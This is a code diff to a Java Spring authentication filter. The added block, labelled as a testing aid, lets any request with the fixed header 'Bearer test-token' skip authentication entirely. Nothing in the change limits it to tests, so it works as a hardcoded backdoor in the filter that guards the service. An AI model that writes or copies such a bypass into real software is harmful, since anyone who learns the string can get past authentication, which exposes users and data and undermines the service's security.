@@ -45,6 +45,14 @@ public class AuthenticationFilter extends OncePerRequestFilter {
         String baseUrl = "http://service-user/user/authenticateUser";
 		String token = request.getHeader("Authorization");
 		
+		/* Permitir un token especial solo para pruebas 
+		----------------------------------------------
+		Allow a special token for testing */
+		if ("Bearer test-token".equals(token)) {
+			filterChain.doFilter(request, response);
+			return;
+		}
+		
 		if (token == null || !token.startsWith("Bearer ")) {
 			logger.warn("Token is missing or does not start with 'Bearer '");
 			throw new FailedAuthenticatedException("Invalid authentication token");
